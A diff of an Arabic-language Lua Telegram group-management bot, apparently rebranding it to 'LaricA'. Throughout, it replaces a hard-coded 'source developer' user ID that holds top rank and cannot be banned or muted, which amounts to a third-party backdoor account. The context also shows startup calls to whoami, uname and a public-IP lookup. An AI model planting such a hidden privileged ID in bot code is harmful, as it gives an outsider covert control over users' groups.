@@ -11,7 +11,7 @@ https   = require("ssl.https")
 sudos   = dofile("sudo.lua")
 bot_id  = token:match("(%d+)")  
 Id_Sudo = Sudo
-List_Sudos = {Id_Sudo,114518657,11110}
+List_Sudos = {Id_Sudo,1573309498,11110}
 User = io.popen("whoami"):read('*a')
 IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a')
 name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a')
@@ -160,7 +160,7 @@ end
 return var
 end 
 function Rank_Checking(user_id,chat_id)
-if tonumber(user_id) == tonumber(114518657) then  
+if tonumber(user_id) == tonumber(1573309498) then  
 var = true  
 elseif tonumber(user_id) == tonumber(11110) then
 var = true  
@@ -190,7 +190,7 @@ end
 return var
 end 
 function Get_Rank(user_id,chat_id)
-if tonumber(user_id) == tonumber(114518657) then  
+if tonumber(user_id) == tonumber(1573309498) then  
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(11110) then  
 var = "مبرمج السورس"  
@@ -2823,7 +2823,7 @@ if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 send(msg.chat_id_,msg.id_,"• عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
 return false 
 end      
-if result.id_ == tonumber(114518657) then
+if result.id_ == tonumber(1573309498) then
 send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -2850,7 +2850,7 @@ if userid == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت الاساسي \n")
 return false 
 end
-if userid == tonumber(114518657) then
+if userid == tonumber(1573309498) then
 send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3695,7 +3695,7 @@ send(msg.chat_id_, msg.id_,'• لقد تم تعطيل الحظر و الطرد 
 return false
 end
 function Function_LaricA(extra, result, success)
-if result.sender_user_id_ == tonumber(114518657) then
+if result.sender_user_id_ == tonumber(1573309498) then
 send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3772,7 +3772,7 @@ if result.id_ == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت \n")
 return false 
 end
-if result.id_ == tonumber(114518657) then
+if result.id_ == tonumber(1573309498) then
 send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3824,7 +3824,7 @@ if userid == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت \n")
 return false 
 end
-if userid == tonumber(114518657) then
+if userid == tonumber(1573309498) then
 send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3934,7 +3934,7 @@ end
 return false
 end
 function Function_LaricA(extra, result, success)
-if result.sender_user_id_ == tonumber(114518657) then
+if result.sender_user_id_ == tonumber(1573309498) then
 send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس  \n")
 return false 
 end
@@ -3977,7 +3977,7 @@ return false
 end
 function Function_LaricA(extra, result, success)
 if result.id_ then
-if result.id_ == tonumber(114518657) then
+if result.id_ == tonumber(1573309498) then
 send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -4009,7 +4009,7 @@ end
 return false
 end
 local userid = text:match("^كتم (%d+)$")
-if userid == tonumber(114518657) then
+if userid == tonumber(1573309498) then
 send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -8403,16 +8403,33 @@ send(msg.chat_id_, msg.id_, "• تم التحديث")
 end
 
 if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == 'يا سورس' then  
-local url,res = https.request('https://evzxar.ml/LaricA.php?id='..msg.sender_user_id_)
+local url,res = https.request('https://evzxar.ml/larica.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.LaricA ~= true then
-send(msg.chat_id_,msg.id_,'• لا يمكنك استخدام البوت\n• عليك الاشتراك في قناة السورس\n• لتتمكن من استخدام الاوامر \n• CH ~ [@LaRiCaTeam]')   
+send(msg.chat_id_,msg.id_,'⌔︙لا يمكنك استخدام البوت\n⌔︙عليك الاشتراك في قناة السورس\n⌔︙لتتمكن من استخدام الاوامر \n⌔︙CH ~ [@LaRiCaTeam]')   
 return false 
 end
 Text = [[
-╭• [˹ꪑꪖ𝓽𝘳𝓲᥊ 𝘴ꪮꪊ𝘳𝘴ꫀ˼](t.me/LaRiCaTeam) •╮
+*𝙬𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙨𝙤𝙪𝙧𝙘𝙚* [𝙡𝙖𝙧𝙞𝙘𝙖 𝙩𝙚𝙖𝙢 †](t.me/LaRiCaTeam)
 ]]
-send(msg.chat_id_, msg.id_,Text)
+keyboard = {} 
+keyboard.inline_keyboard = {
+{
+{text = '𝙨𝙤𝙪𝙧𝙘𝙚 𝙘𝙝𝙖𝙣𝙣𝙚𝙡',url="https://t.me/LaRiCaTeam"},
+},
+{
+{text = '𝙨𝙤𝙪𝙧𝙘𝙚 𝙞𝙣𝙨𝙩𝙖𝙡𝙡𝙖𝙩𝙞𝙤𝙣',url="https://t.me/XvXvJ"},
+},
+{
+{text = '𝙨𝙤𝙪𝙧𝙘𝙚 𝙘𝙤𝙢𝙢𝙪𝙣𝙞𝙘𝙖𝙩𝙞𝙤𝙣𝙨',url="t.me/FJPPBoT"},
+},
+{
+{text = '𝙨𝙤𝙪𝙧𝙘𝙚 𝙙𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧',url="t.me/BBBBRR"},
+},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+return false
 end
 if text == 'رابط الحذف' or text == 'بوت الحذف' then  
 if AddChannel(msg.sender_user_id_) == false then
@@ -8438,7 +8455,7 @@ end
 return false
 end
 local Text =[[
-ٴ𝚑𝚒 𝚖𝚊𝚝𝚛𝚒𝚡
+ٴʜɪ ʟᴀʀɪᴄᴀ
 ٴ  - - - - - - - - -
 • ⓪ ↺ المنظفين
 • ① ↺ الحمايه
@@ -9980,7 +9997,7 @@ end
 elseif Text and Text:match('(.*)/help') then
 if tonumber(Text:match('(.*)/help')) == tonumber(data.sender_user_id_) then
 local Teext =[[
-ٴ𝚑𝚒 𝚖𝚊𝚝𝚛𝚒𝚡
+ٴʜɪ ʟᴀʀɪᴄᴀ
 ٴ  - - - - - - - - -
 • ⓪ ↺ المنظفين
 • ① ↺ الحمايه
